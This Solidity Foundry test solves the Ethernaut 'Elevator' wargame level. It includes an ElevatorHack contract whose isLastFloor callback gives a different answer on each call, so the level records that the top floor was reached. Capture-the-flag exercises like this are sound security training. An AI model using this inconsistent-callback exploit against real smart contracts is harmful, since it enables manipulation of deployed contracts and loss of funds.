// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract ElevatorTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testElevatorHack() public {
        /****************
         * Factory setup *
         *************** */
        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        ElevatorHack elevatorHack = new ElevatorHack(levelAddress);
        elevatorHack.hack();
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ElevatorHack {
    Elevator public challenge;
    uint256 floorUp = 0;
    // -- 1 --
    constructor(address challengeAddress) {
        challenge = Elevator(payable(challengeAddress));
    }

    function hack() external {
        // -- 2 --
        challenge.goTo(1);
    }

    function isLastFloor(
        uint256 /* floor */
    ) external returns (bool) {
        floorUp++;
        if (floorUp > 1) {
            return true;
        } else {
            return false;
        }
    }
}
